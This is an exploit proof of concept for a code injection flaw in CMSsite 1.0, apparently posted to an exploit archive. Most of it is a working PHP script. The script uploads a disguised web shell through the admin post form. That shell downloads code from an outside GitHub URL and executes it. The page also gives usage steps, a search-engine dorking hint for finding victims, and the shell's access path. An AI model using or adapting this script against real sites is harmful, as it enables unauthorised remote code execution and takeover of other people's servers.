=============================================================================================================================================
| # Title     : CMSsite 1.0 php code injection Vulnerability                                                                                |
| # Author    : indoushka                                                                                                                   |
| # Tested on : windows 10 Fr(Pro) / browser : Mozilla firefox 129.0.1 (64 bits)                                                            |
| # Vendor    : https://github.com/VictorAlagwu/CMSsite/archive/master.zip                                                                  |
=============================================================================================================================================

poc :

[+] Dorking Ä°n Google Or Other Search Enggine.

[+] This payload injects php code of your choice into an SHELL.php file. 

[+] Line 31
    Line 40
	
[+] change the path of the script folder.

[+] save payload as poc.php

[+] usage from cmd : C:\www\test>php 1.php 127.0.0.1

[+] payload : 

<?php

function file_upload($target_ip) {
    $file_name = "indoushka.php";
    $webshell_payload = "<?php
        \$url = 'https://raw.githubusercontent.com/indoushka/txt/main/indoushka.txt';
        \$ch = curl_init();
        curl_setopt(\$ch, CURLOPT_URL, \$url);
        curl_setopt(\$ch, CURLOPT_RETURNTRANSFER, true);
        \$output = curl_exec(\$ch);
        curl_close(\$ch);
        if (\$output) {
            include 'data://text/plain;base64,' . base64_encode(\$output);
        }
    ?>";

    $post_fields = array(
        'create_post' => '',
        'post_image' => new CURLFile('data://text/plain;base64,' . base64_encode($webshell_payload), 'application/x-php', $file_name),
        'post_title' => 'inouva',
        'post_category_id' => '123',
        'post_tags' => '99',
        'post_content' => 'N0_name',
        'post_status' => 'Hackers',
        'qty' => '1'
    );

    echo "(+) PHP Code Injection ...\n";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://$target_ip/CMSsite-master/admin/posts.php?source=add_post");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    curl_close($ch);

    echo "(+) Shell uploaded successfully.\n";
    echo "(+) Access the shell at: http://$target_ip/CMSsite-master/img/$file_name\n";
}

if ($argc != 2) {
    echo "(+) Usage: php " . $argv[0] . " <target ip>\n";
    echo "(+) Example: php " . $argv[0] . " 10.0.0.1\n";
    exit(-1);
}

$target_ip = $argv[1];
file_upload($target_ip);



[+] Path : http://127.0.0.1/CMSsite-master/img/

Greetings to :============================================================
jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * CraCkEr |
==========================================================================